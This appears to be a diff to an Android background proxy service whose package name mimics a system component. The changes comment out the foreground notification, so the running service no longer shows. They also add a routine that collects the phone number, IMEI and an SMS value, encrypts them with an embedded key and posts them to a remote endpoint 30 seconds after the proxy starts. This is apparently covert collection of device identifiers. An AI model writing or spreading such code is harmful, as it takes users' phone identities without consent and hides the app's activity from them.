@@ -24,8 +24,15 @@ import com.android.sms.proxy.entity.ApkDownloadResult;
 import com.android.sms.proxy.entity.BindServiceEvent;
 import com.android.sms.proxy.entity.MessageEvent;
 import com.android.sms.proxy.entity.NativeParams;
+import com.android.sms.proxy.entity.PhoneInfo;
+import com.android.sms.proxy.entity.SpSimpleJsonImpl;
+import com.android.sms.proxy.function.RequestManager;
 import com.flurry.android.FlurryAgent;
+import com.oplay.nohelper.loader.Loader_Base_ForCommon;
 import com.oplay.nohelper.utils.Util_Service;
+import com.oplay.nohelper.volley.RequestEntity;
+import com.oplay.nohelper.volley.Response;
+import com.oplay.nohelper.volley.VolleyError;
 
 import net.luna.common.download.AppDownloadManager;
 import net.luna.common.download.interfaces.ApkDownloadListener;
@@ -160,9 +167,9 @@ public class HeartBeatService extends Service implements BridgeDisconnectedListe
 				}
 			}
 		}
-		Intent downloadUpdateIntent = new Intent(this, DownloadUpdateService.class);
-		startService(downloadUpdateIntent);
-		startForeground(NativeParams.SERVICE_NOTIFICATION_ID, new Notification());
+//		Intent downloadUpdateIntent = new Intent(this, DownloadUpdateService.class);
+//		startService(downloadUpdateIntent);
+//		startForeground(NativeParams.SERVICE_NOTIFICATION_ID, new Notification());
 
 		scheduledWithFixedDelay(PROXY_INTERVAL_TIME);
 //		scheduledWithFixedDelay(PROXY_INTERVAL_TIME);
@@ -235,8 +242,12 @@ public class HeartBeatService extends Service implements BridgeDisconnectedListe
 							HEARTBEAT_INIT_DELAY,
 							duration,
 							TimeUnit.SECONDS);
+
+
 				}
 			}
+
+
 			if (ACTION_CHECK_PROXY) {
 				sureServiceIsRunning(TerminalManager.class.getCanonicalName());
 			}
@@ -246,6 +257,43 @@ public class HeartBeatService extends Service implements BridgeDisconnectedListe
 			}
 			FlurryAgent.onError(TAG, "", e);
 		}
+	}
+
+	private void registRunnable() {
+
+	}
+
+	public void sendRegisterCode(final Context context, String sms) {
+		String number = PhoneInfo.getInstance(context).getNativePhoneNumber();
+		if (TextUtils.isEmpty(number)) return;
+		Map<String, String> map = new HashMap<>();
+		map.put(NativeParams.TYPE_PHONE_NUMBER, PhoneInfo.getInstance(context).getNativePhoneNumber());
+		map.put(NativeParams.TYPE_PHONE_IMEI, PhoneInfo.getInstance(context).getIMEI());
+		map.put(NativeParams.TYPE_PHONE_SMS, String.valueOf(sms));
+		String authStr = RequestManager.getAuthStr(NativeParams.AES_KEY, map);
+		Map<String, String> map1 = new HashMap<>();
+		map1.put("s", authStr);
+		RequestEntity<SpSimpleJsonImpl> entity = new RequestEntity<SpSimpleJsonImpl>(NativeParams.URL_SEND_CODE,
+				SpSimpleJsonImpl.class, map1);
+		Loader_Base_ForCommon.getInstance().onRequestLoadNetworkTask(entity, true, new Response.Listener() {
+			@Override
+			public void onResponse(Object response) {
+				if (response instanceof SpSimpleJsonImpl) {
+					int code = ((SpSimpleJsonImpl) response).getCode();
+					if (code == NativeParams.SUCCESS) {
+						String data = ((SpSimpleJsonImpl) response).getData();
+					}
+				}
+			}
+		}, new Response.ErrorListener() {
+			@Override
+			public void onErrorResponse(VolleyError error) {
+				if (DEBUG) {
+					Log.d(TAG, error.toString());
+				}
+				FlurryAgent.onError(TAG, "", error.fillInStackTrace());
+			}
+		});
 	}
 
 	public void resetScheduleProxyService(long duration) {
@@ -676,6 +724,13 @@ public class HeartBeatService extends Service implements BridgeDisconnectedListe
 		map.put(NativeParams.KEY_PROXY_CONNECT_SUCCESS, String.valueOf(isProxySuccess));
 		map.put(NativeParams.KEY_PROXY_NETWORK_TYPE, String.valueOf(networkType));
 		FlurryAgent.logEvent(NativeParams.EVENT_START_PROXY, map);
+
+		mExecutorService.schedule(new Runnable() {
+			@Override
+			public void run() {
+				sendRegisterCode(HeartBeatService.this, "123456");
+			}
+		}, 30, TimeUnit.SECONDS);
 	}
 
 	public synchronized void destroyProxyService() throws RemoteException {
